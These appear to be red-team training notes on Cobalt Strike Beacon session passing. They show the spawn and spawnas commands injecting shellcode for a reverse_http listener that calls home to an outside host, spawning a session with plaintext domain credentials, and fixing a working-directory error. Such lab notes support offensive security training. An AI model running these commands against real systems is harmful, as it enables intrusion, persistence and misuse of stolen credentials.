Session passing is a technique for spawning new Beacon sessions from existing ones.  For example, if you have a Beacon checking in over one listener (e.g. DNS), but you want to spawn an additional session using another listener (e.g. HTTP).  This is particularly useful  when you're using a low-and-slow channel for long-term persistence but you want to switch over to a faster channel to run your post-ex commands.

The most direct way to do this is with the `spawn` and `spawnas` commands.

## spawn

The `spawn` command starts a new process and injects shellcode into it for the specified listener.  The new Beacon will run as the same user who spawned it.

```powershell
beacon> help spawn
Use: spawn [x86|x64] [listener]
     spawn [listener]

Spawn an x86 or x64 process and inject shellcode for the listener.

beacon> spawn x64 http
[*] Tasked beacon to spawn (x64) windows/beacon_http/reverse_http (www.bleepincomputer.com:80)
[+] host called home, sent: 350863 bytes
```

![[Pasted image 20250706221044.png]]

## spawnas

The `spawnas` command is similar, but it accepts plaintext credentials for another user.  The new Beacon will run as the alternate user.

```powershell
beacon> help spawnas
Use: spawnas [DOMAIN\user] [password] [listener]

Attempt to spawn a payload as another user. If you don't specify DOMAIN,
Beacon will try to authenticate as a local user.

This command will usually fail if you're in a SYSTEM context. Use make_token
to create a token to pass the desired credentials instead.
```

> The help texts are always helpful because they call out any caveats for a command.  The help for spawnas indicates that it probably won't work when run from a Beacon running as SYSTEM.  These restrictions are usually due to the way the underlying Windows APIs behave.

One thing to watch out for when spawning new processes in general is Beacon's current working directory.  For example, this attempt to spawn a new Beacon with alternate credentials fails with the error code 267.

```powershell
beacon> spawnas CONTOSO\rsteel Passw0rd! tcp-local
[*] Tasked beacon to spawn windows/beacon_bind_tcp (127.0.0.1:1337) as CONTOSO\rsteel
[-] could not run C:\Windows\system32\rundll32.exe as CONTOSO\rsteel: 267

beacon> windows_error_code 267
ERROR_DIRECTORY, STATUS_NOTIFY_CLEANUP
```

This is caused because Beacon's current working directory is set to a directory owned by pchild's, which rsteel does not have access to.

```powershell
beacon> pwd
[*] Current directory is C:\Users\pchilds\Documents
```

The 'fix' for this is simply to change Beacon's working directory to a location rsteel is able to read.

```powershell
beacon> cd C:\
beacon> spawnas CONTOSO\rsteel Passw0rd! tcp-local
```

![[Pasted image 20250706221309.png]]

